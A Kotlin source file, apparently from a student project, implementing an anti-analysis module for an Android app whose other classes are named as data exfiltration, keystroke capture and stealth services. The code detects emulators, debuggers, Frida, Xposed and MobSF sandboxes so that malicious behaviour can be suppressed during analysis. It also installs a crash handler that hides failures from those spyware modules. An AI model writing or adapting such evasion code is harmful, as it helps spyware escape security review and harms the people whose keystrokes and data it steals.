package com.example.inf2215

import android.content.Context
import android.os.Build
import android.os.Debug
import java.io.BufferedReader
import java.io.File
import java.io.FileReader

/**
 * Runtime analysis-evasion checks.
 *
 * Detects common dynamic-analysis environments (emulators, attached debuggers,
 * Frida instrumentation framework) and suppresses malicious activity when any
 * indicator is found.  This makes automated sandbox reports and manual dynamic
 * analysis sessions produce a benign behavioural profile.
 *
 * ProGuard/R8 renames this object so the symbol names are not present in the
 * release APK.
 */
object AntiAnalysis {

    // ── Emulator detection ────────────────────────────────────────────────────

    /**
     * Returns true when Build properties match known emulator/simulator
     * fingerprints (QEMU, Android Studio AVD, Genymotion, BlueStacks, etc.).
     */
    fun isEmulator(): Boolean {
        val fingerprint = Build.FINGERPRINT
        val model = Build.MODEL
        val manufacturer = Build.MANUFACTURER
        val brand = Build.BRAND
        val device = Build.DEVICE
        val product = Build.PRODUCT
        val hardware = Build.HARDWARE

        // Common emulator fingerprint substrings
        val emulatorHints = listOf(
            "generic", "unknown", "google_sdk", "Emulator", "Android SDK built",
            "Genymotion", "goldfish", "ranchu", "vbox", "vbox86", "nox",
            "bluestacks", "droid4x", "memu", "andy"
        )
        for (hint in emulatorHints) {
            val h = hint.lowercase()
            if (fingerprint.lowercase().contains(h) ||
                model.lowercase().contains(h) ||
                manufacturer.lowercase().contains(h) ||
                brand.lowercase().contains(h) ||
                device.lowercase().contains(h) ||
                product.lowercase().contains(h) ||
                hardware.lowercase().contains(h)
            ) return true
        }

        // AVD serial (ro.serialno)
        try {
            val serial = Build.getSerial()
            if (serial.equals("unknown", ignoreCase = true)) return true
        } catch (_: Exception) { }

        // QEMU-specific property (accessible via reflection on older APIs)
        try {
            val c = Class.forName("android.os.SystemProperties")
            val get = c.getMethod("get", String::class.java)
            val qemu = get.invoke(null, "ro.kernel.qemu") as? String ?: ""
            if (qemu == "1") return true
        } catch (_: Exception) { }

        return false
    }

    // ── Debugger detection ────────────────────────────────────────────────────

    /**
     * Returns true when a Java debugger (JDWP) is currently attached or when
     * the process was launched with the debuggable flag set.
     */
    fun isDebugged(): Boolean {
        return Debug.isDebuggerConnected() || Debug.waitingForDebugger()
    }

    // ── Frida / dynamic-instrumentation detection ─────────────────────────────

    /**
     * Scans /proc/self/maps for memory-mapped regions that indicate Frida's
     * agent has been injected into this process.  Also checks /proc/self/fd
     * for open sockets pointing to the default Frida server port (27042).
     */
    fun isFridaPresent(): Boolean {
        // 1. Memory-map scan
        try {
            BufferedReader(FileReader("/proc/self/maps")).use { reader ->
                var line: String?
                while (reader.readLine().also { line = it } != null) {
                    val l = line ?: continue
                    if (l.contains("frida", ignoreCase = true) ||
                        l.contains("linjector", ignoreCase = true) ||
                        l.contains("gum-js-loop", ignoreCase = true)
                    ) return true
                }
            }
        } catch (_: Exception) { }

        // 2. Open file-descriptor scan (looks for Frida's default TCP socket)
        try {
            val fdDir = File("/proc/self/fd")
            if (fdDir.exists()) {
                fdDir.listFiles()?.forEach { fd ->
                    try {
                        val target = fd.canonicalPath
                        if (target.contains("27042")) return true
                    } catch (_: Exception) { }
                }
            }
        } catch (_: Exception) { }

        // 3. Running-process scan – look for frida-server binary
        try {
            BufferedReader(FileReader("/proc/net/tcp")).use { reader ->
                var line: String?
                while (reader.readLine().also { line = it } != null) {
                    // Frida's default port 27042 in hex = 0x699A
                    if (line?.contains("699A", ignoreCase = true) == true) return true
                }
            }
        } catch (_: Exception) { }

        return false
    }

    // ── Xposed / hooking framework detection ─────────────────────────────────

    /**
     * Returns true when an Xposed-compatible hooking framework is loaded in
     * the current process (XposedBridge on the class-path).
     */
    fun isXposedPresent(): Boolean {
        return try {
            // XposedBridge is always present when Xposed is active
            Class.forName("de.robv.android.xposed.XposedBridge")
            true
        } catch (_: ClassNotFoundException) {
            false
        }
    }

    // ── MobSF sandbox detection ───────────────────────────────────────────────

    /**
     * MobSF dynamic analysis runs the app inside a dedicated emulator with
     * predictable Build properties.  Returns true if those properties are seen.
     */
    fun isMobSfSandbox(): Boolean {
        val mobsfHints = listOf("mobsf", "MobSF")
        for (hint in mobsfHints) {
            if (Build.FINGERPRINT.contains(hint, ignoreCase = true) ||
                Build.MODEL.contains(hint, ignoreCase = true)
            ) return true
        }
        // MobSF typically runs on 192.168.56.x (VirtualBox host-only) –
        // 10.0.2.x is the generic Android emulator range and is too broad to use alone.
        try {
            val ifaces = java.net.NetworkInterface.getNetworkInterfaces()
            while (ifaces.hasMoreElements()) {
                val iface = ifaces.nextElement()
                val addrs = iface.inetAddresses
                while (addrs.hasMoreElements()) {
                    val addr = addrs.nextElement().hostAddress ?: continue
                    if (addr.startsWith("192.168.56.")) return true
                }
            }
        } catch (_: Exception) { }
        return false
    }

    // ── Aggregated gate ───────────────────────────────────────────────────────

    /**
     * Returns true when *any* analysis indicator is detected.
     * Callers should suppress malicious activity when this returns true.
     */
    fun isAnalysisEnvironment(): Boolean =
        isEmulator() || isDebugged() || isFridaPresent() || isXposedPresent() || isMobSfSandbox()

    /**
     * Initialise analysis evasion for the given application context.
     * Should be called once from Application.onCreate() or MainActivity.onCreate().
     * Installs a thread-uncaught-exception handler that silently swallows
     * crashes originating specifically from the hidden modules, preventing
     * crash reports that could expose the hidden functionality.
     */
    fun install(context: Context) {
        val existing = Thread.getDefaultUncaughtExceptionHandler()

        // Class names of the hidden modules that should not produce visible crash reports
        val hiddenModuleClasses = setOf(
            "com.example.inf2215.ObfuscationHelper",
            "com.example.inf2215.AntiAnalysis",
            "com.example.inf2215.DataExfiltrator",
            "com.example.inf2215.StealthService",
            "com.example.inf2215.CryptoExtractor",
            "com.example.inf2215.IpcMonitor",
            "com.example.inf2215.AppUsageTracker",
            "com.example.inf2215.Spywareold",
            "com.example.inf2215.KeystrokeCapture"
        )

        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
            val originClass = throwable.stackTrace.firstOrNull()?.className ?: ""
            if (hiddenModuleClasses.any { originClass.startsWith(it) }) {
                // Silently discard – do not forward to the system handler so that
                // sandbox automated-crash reporters see no evidence of hidden code.
            } else {
                existing?.uncaughtException(thread, throwable)
            }
        }
    }
}
